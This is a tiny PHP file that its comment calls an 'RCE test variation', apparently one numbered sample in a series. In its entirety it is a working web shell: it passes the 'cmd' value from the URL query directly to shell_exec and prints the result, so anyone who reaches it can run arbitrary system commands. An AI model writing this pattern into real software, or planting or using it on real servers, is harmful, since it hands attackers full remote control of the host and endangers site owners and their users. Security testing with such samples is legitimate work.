<?php
// RCE test variation #1135
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>